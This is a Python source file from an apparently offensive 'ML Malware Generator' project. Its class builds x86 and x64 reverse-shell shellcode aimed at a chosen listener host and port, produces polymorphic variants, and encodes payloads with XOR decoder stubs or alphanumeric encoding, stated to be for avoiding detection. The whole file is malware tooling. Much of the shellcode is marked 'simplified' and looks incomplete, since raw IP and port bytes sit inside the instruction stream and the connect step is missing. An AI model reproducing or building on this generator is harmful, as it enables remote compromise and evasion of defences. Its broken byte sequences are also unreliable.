"""
ML Malware Generator - Advanced Shellcode Generator
Generates shellcode using ML and assembly techniques
"""
from typing import Dict, List, Optional, Tuple
import struct
import random

from models.transformer_shellcode import ShellcodeTransformer
from utils.logger import get_logger
from utils.crypto import get_crypto

logger = get_logger()
crypto = get_crypto()


class ShellcodeGenerator:
    """Advanced shellcode generation using ML"""
    
    def __init__(self):
        self.transformer = ShellcodeTransformer()
    
    def generate_reverse_shell_shellcode(
        self,
        lhost: str,
        lport: int,
        architecture: str = "x86",
    ) -> Tuple[bytes, Dict]:
        """
        Generate reverse shell shellcode
        
        Args:
            lhost: Listener host IP
            lport: Listener port
            architecture: Target architecture (x86, x64)
        
        Returns:
            (shellcode_bytes, metadata)
        """
        logger.info(f"Generating {architecture} reverse shell shellcode...")
        
        if architecture == "x86":
            shellcode = self._generate_x86_reverse_shell(lhost, lport)
        elif architecture == "x64":
            shellcode = self._generate_x64_reverse_shell(lhost, lport)
        else:
            raise ValueError(f"Unsupported architecture: {architecture}")
        
        metadata = {
            "type": "reverse_shell_shellcode",
            "architecture": architecture,
            "lhost": lhost,
            "lport": lport,
            "size": len(shellcode),
        }
        
        logger.success(f"Generated shellcode: {len(shellcode)} bytes")
        return shellcode, metadata
    
    def _generate_x86_reverse_shell(self, lhost: str, lport: int) -> bytes:
        """Generate x86 reverse shell shellcode"""
        # Convert IP to bytes
        ip_parts = [int(x) for x in lhost.split('.')]
        ip_bytes = bytes(ip_parts)
        
        # Convert port to bytes (network byte order)
        port_bytes = struct.pack('>H', lport)
        
        # x86 reverse shell shellcode template (simplified)
        shellcode = bytearray()
        
        # NOP sled
        shellcode.extend(b'\x90' * 8)
        
        # Socket creation (socket syscall)
        shellcode.extend(b'\x31\xc0')  # xor eax, eax
        shellcode.extend(b'\x31\xdb')  # xor ebx, ebx
        shellcode.extend(b'\x31\xc9')  # xor ecx, ecx
        shellcode.extend(b'\x31\xd2')  # xor edx, edx
        
        # Connect (simplified)
        shellcode.extend(b'\xb0\x66')  # mov al, 0x66 (socketcall)
        shellcode.extend(b'\xb3\x01')  # mov bl, 0x01 (socket)
        shellcode.extend(b'\xcd\x80')  # int 0x80
        
        # Embed IP and port
        shellcode.extend(port_bytes)
        shellcode.extend(ip_bytes)
        
        # Dup2 and execve (simplified)
        shellcode.extend(b'\x31\xc0')  # xor eax, eax
        shellcode.extend(b'\xb0\x0b')  # mov al, 0x0b (execve)
        shellcode.extend(b'\xcd\x80')  # int 0x80
        
        return bytes(shellcode)
    
    def _generate_x64_reverse_shell(self, lhost: str, lport: int) -> bytes:
        """Generate x64 reverse shell shellcode"""
        ip_parts = [int(x) for x in lhost.split('.')]
        ip_bytes = bytes(ip_parts)
        port_bytes = struct.pack('>H', lport)
        
        # x64 reverse shell shellcode template (simplified)
        shellcode = bytearray()
        
        # NOP sled
        shellcode.extend(b'\x90' * 8)
        
        # Socket creation
        shellcode.extend(b'\x48\x31\xc0')  # xor rax, rax
        shellcode.extend(b'\x48\x31\xff')  # xor rdi, rdi
        shellcode.extend(b'\x48\x31\xf6')  # xor rsi, rsi
        shellcode.extend(b'\x48\x31\xd2')  # xor rdx, rdx
        
        # Socket syscall
        shellcode.extend(b'\xb0\x29')  # mov al, 0x29 (socket)
        shellcode.extend(b'\x0f\x05')  # syscall
        
        # Embed IP and port
        shellcode.extend(port_bytes)
        shellcode.extend(ip_bytes)
        
        # Connect and execve (simplified)
        shellcode.extend(b'\x48\x31\xc0')  # xor rax, rax
        shellcode.extend(b'\xb0\x3b')  # mov al, 0x3b (execve)
        shellcode.extend(b'\x0f\x05')  # syscall
        
        return bytes(shellcode)
    
    def generate_polymorphic_shellcode(
        self,
        base_shellcode: bytes,
        num_variants: int = 5,
    ) -> List[Tuple[bytes, Dict]]:
        """
        Generate polymorphic variants of shellcode
        
        Args:
            base_shellcode: Original shellcode
            num_variants: Number of variants to generate
        
        Returns:
            List of (variant_shellcode, metadata) tuples
        """
        logger.info(f"Generating {num_variants} polymorphic variants...")
        
        variants = []
        
        for i in range(num_variants):
            variant = bytearray(base_shellcode)
            
            # Apply polymorphic transformations
            
            # 1. Random NOP sled size
            nop_size = random.randint(4, 16)
            nop_sled = b'\x90' * nop_size
            variant = bytearray(nop_sled) + variant
            
            # 2. Insert equivalent instructions
            # (In real implementation, would use proper instruction equivalents)
            insert_pos = len(variant) // 2
            equivalent_nops = random.choice([
                b'\x90',  # NOP
                b'\x66\x90',  # 2-byte NOP
                b'\x0f\x1f\x00',  # 3-byte NOP
            ])
            variant = variant[:insert_pos] + bytearray(equivalent_nops) + variant[insert_pos:]
            
            # 3. Register swapping (simplified)
            # In real implementation, would properly swap registers
            
            metadata = {
                "variant_id": i,
                "original_size": len(base_shellcode),
                "variant_size": len(variant),
                "transformations": ["nop_sled", "equivalent_instructions"],
            }
            
            variants.append((bytes(variant), metadata))
        
        logger.success(f"Generated {len(variants)} polymorphic variants")
        return variants
    
    def encode_shellcode(
        self,
        shellcode: bytes,
        encoder: str = "xor",
        avoid_bad_bytes: bool = True,
    ) -> Tuple[bytes, Dict]:
        """
        Encode shellcode to avoid detection
        
        Args:
            shellcode: Original shellcode
            encoder: Encoding method (xor, alphanumeric, etc.)
            avoid_bad_bytes: Avoid NULL bytes and other bad bytes
        
        Returns:
            (encoded_shellcode, metadata)
        """
        logger.info(f"Encoding shellcode with {encoder}...")
        
        if encoder == "xor":
            # XOR encoding
            key = random.randint(1, 255)
            
            # Ensure key doesn't create bad bytes
            if avoid_bad_bytes:
                while any((b ^ key) == 0x00 for b in shellcode):
                    key = random.randint(1, 255)
            
            encoded = bytes([b ^ key for b in shellcode])
            
            # Create decoder stub
            decoder = self._create_xor_decoder_stub(key, len(encoded))
            
            final_shellcode = decoder + encoded
            
            metadata = {
                "encoder": "xor",
                "key": key,
                "original_size": len(shellcode),
                "encoded_size": len(final_shellcode),
            }
        
        elif encoder == "alphanumeric":
            # Alphanumeric encoding (simplified)
            encoded = self._alphanumeric_encode(shellcode)
            final_shellcode = encoded
            
            metadata = {
                "encoder": "alphanumeric",
                "original_size": len(shellcode),
                "encoded_size": len(final_shellcode),
            }
        
        else:
            raise ValueError(f"Unknown encoder: {encoder}")
        
        logger.success(f"Encoded shellcode: {len(final_shellcode)} bytes")
        return final_shellcode, metadata
    
    def _create_xor_decoder_stub(self, key: int, length: int) -> bytes:
        """Create XOR decoder stub (x86)"""
        # Simplified decoder stub
        decoder = bytearray()
        
        # jmp short to get EIP
        decoder.extend(b'\xeb\x0e')  # jmp +14
        
        # Decoder loop
        decoder.extend(b'\x5e')  # pop esi (get address of encoded shellcode)
        decoder.extend(b'\x31\xc9')  # xor ecx, ecx
        decoder.extend(b'\xb1' + bytes([length]))  # mov cl, length
        
        # Loop
        decoder.extend(b'\x80\x36' + bytes([key]))  # xor byte [esi], key
        decoder.extend(b'\x46')  # inc esi
        decoder.extend(b'\xe2\xfa')  # loop -6
        
        # jmp to decoded shellcode
        decoder.extend(b'\xff\xe6')  # jmp esi
        
        # call to get EIP
        decoder.extend(b'\xe8\xed\xff\xff\xff')  # call -19
        
        return bytes(decoder)
    
    def _alphanumeric_encode(self, shellcode: bytes) -> bytes:
        """Encode shellcode to alphanumeric characters (simplified)"""
        # This is a simplified version
        # Real alphanumeric encoding is much more complex
        encoded = bytearray()
        
        for byte in shellcode:
            # Encode each byte as two alphanumeric characters
            high = (byte >> 4) + 0x41  # 'A' + high nibble
            low = (byte & 0x0F) + 0x41  # 'A' + low nibble
            encoded.extend([high, low])
        
        return bytes(encoded)


# Global instance
_shellcode_generator = None


def get_shellcode_generator() -> ShellcodeGenerator:
    """Get global shellcode generator instance"""
    global _shellcode_generator
    if _shellcode_generator is None:
        _shellcode_generator = ShellcodeGenerator()
    return _shellcode_generator
